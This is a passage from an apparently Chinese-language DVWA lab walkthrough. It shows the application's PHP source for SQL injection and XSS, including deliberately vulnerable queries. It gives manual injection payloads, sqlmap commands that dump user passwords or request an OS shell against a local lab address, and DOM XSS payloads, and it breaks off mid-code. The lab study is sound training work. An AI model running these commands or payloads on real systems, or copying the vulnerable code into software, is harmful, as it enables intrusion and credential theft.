class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:id&#x27;</span>, <span class=\"variable\">$id</span>, PDO::PARAM_INT );</span><br><span class=\"line\">        <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"variable\">$data</span>-&gt;fetch();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Make sure only 1 result is returned</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( <span class=\"variable\">$data</span>-&gt;rowCount() == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Get values</span></span><br><span class=\"line\">            <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[ <span class=\"string\">&#x27;first_name&#x27;</span> ];</span><br><span class=\"line\">            <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[ <span class=\"string\">&#x27;last_name&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_SESSION</span> [ <span class=\"string\">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>], <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get results</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>( <span class=\"variable\">$row</span> = mysqli_fetch_assoc( <span class=\"variable\">$result</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get values</span></span><br><span class=\"line\">        <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;first_name&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;last_name&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>], <span class=\"variable\">$id</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class=\"subst\">$id</span>;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>], <span class=\"variable\">$query</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get results</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>( <span class=\"variable\">$row</span> = mysqli_fetch_assoc( <span class=\"variable\">$result</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Display values</span></span><br><span class=\"line\">        <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;first_name&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;last_name&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// This is used later on in the index.php page</span></span><br><span class=\"line\"><span class=\"comment\">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class=\"line\"><span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"><span class=\"variable\">$number_of_rows</span> = mysqli_fetch_row( <span class=\"variable\">$result</span> )[<span class=\"number\">0</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low SQL Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$id</span> = <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;id&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class=\"subst\">$id</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get results</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>( <span class=\"variable\">$row</span> = mysqli_fetch_assoc( <span class=\"variable\">$result</span> ) ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get values</span></span><br><span class=\"line\">        <span class=\"variable\">$first</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;first_name&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$last</span>  = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;last_name&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;ID: <span class=\"subst\">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class=\"subst\">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class=\"subst\">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-7\"><a class=\"markdownIt-Anchor\" href=\"#low-7\">#</a> Low</h3>\n<p>特点：GET</p>\n<ul>\n<li>1</li>\n<li>1’//wrong</li>\n<li>1’ or 1=1–</li>\n<li>1’ union select 1,database()–</li>\n<li>sqlmap</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://0.0.0.0/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-7\"><a class=\"markdownIt-Anchor\" href=\"#medium-7\">#</a> Medium</h3>\n<p>特点：POST</p>\n<ul>\n<li>手工注入</li>\n<li>id=1 union select 1,table_name from information_schema=dvwa–</li>\n<li>HEX 加密关键字</li>\n<li>id=1 union select 1,table_name from information_schema=0x64767761–</li>\n<li>sqlmap --data 参数</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">脱裤</span></span><br><span class=\"line\">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">上马</span></span><br><span class=\"line\">lmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --os-shell</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">需要加绝对路径，可以利用phpinfo()</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"high-7\"><a class=\"markdownIt-Anchor\" href=\"#high-7\">#</a> High</h3>\n<p>特点：返回到不同页面</p>\n<ul>\n<li>手动无差别</li>\n<li>sqlmap --second-url 参数</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/session-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=high; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/&quot;-D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424185429439.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210424185429439\"></p>\n<h2 id=\"sql-injection-blind\"><a class=\"markdownIt-Anchor\" href=\"#sql-injection-blind\">#</a> SQL Injection (Blind)</h2>\n<h3 id=\"low-8\"><a class=\"markdownIt-Anchor\" href=\"#low-8\">#</a> Low</h3>\n<ul>\n<li>手注过于麻烦不演示</li>\n<li>sqlmap</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=f48dupm9bkmo862t404a2hmvl1&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-8\"><a class=\"markdownIt-Anchor\" href=\"#medium-8\">#</a> Medium</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u&quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/#&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"high-8\"><a class=\"markdownIt-Anchor\" href=\"#high-8\">#</a> High</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;192.168.23.133/dvwa/vulnerabilities/sqli_blind/cookie-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;id=1; security=high; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/&quot; -D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure>\n<h2 id=\"weak-session-ids\"><a class=\"markdownIt-Anchor\" href=\"#weak-session-ids\">#</a> Weak Session IDs</h2>\n<h3 id=\"low-9\"><a class=\"markdownIt-Anchor\" href=\"#low-9\">#</a> Low</h3>\n<h3 id=\"medium-9\"><a class=\"markdownIt-Anchor\" href=\"#medium-9\">#</a> Medium</h3>\n<h3 id=\"high-9\"><a class=\"markdownIt-Anchor\" href=\"#high-9\">#</a> High</h3>\n<h2 id=\"dom-based-cross-site-scripting-xss\"><a class=\"markdownIt-Anchor\" href=\"#dom-based-cross-site-scripting-xss\">#</a> DOM Based Cross Site Scripting (XSS)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//DOM Based Cross Site Scripting (XSS) Vulnerability</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( array_key_exists( <span class=\"string\">&quot;default&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; !is_null (<span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># White list the allowable languages</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;default&#x27;</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;French&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;English&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;German&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;Spanish&quot;</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ok</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            header (<span class=\"string\">&quot;location: ?default=English&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( array_key_exists( <span class=\"string\">&quot;default&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; !is_null (<span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$default</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;default&#x27;</span>];</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Do not allow script tags</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (stripos (<span class=\"variable\">$default</span>, <span class=\"string\">&quot;&lt;script&quot;</span>) !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">        header (<span class=\"string\">&quot;location: ?default=English&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># No protections, anything goes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-10\"><a class=\"markdownIt-Anchor\" href=\"#low-10\">#</a> Low</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"regexp\">/xss/</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-10\"><a class=\"markdownIt-Anchor\" href=\"#medium-10\">#</a> Medium</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">option</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">select</span>&gt;</span>&lt;img%20src=&quot;x&quot;%20onerror=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"high-10\"><a class=\"markdownIt-Anchor\" href=\"#high-10\">#</a> High</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">English#<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"regexp\">/xss/</span>);</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">#之后的被过滤，不传到服务端</span><br></pre></td></tr></table></figure>\n<h2 id=\"reflected-cross-site-scripting-xss\"><a class=\"markdownIt-Anchor\" href=\"#reflected-cross-site-scripting-xss\">#</a> Reflected Cross Site Scripting (XSS)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Reflected XSS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = htmlspecialchars( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header (<span class=\"string\">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = preg_replace( <span 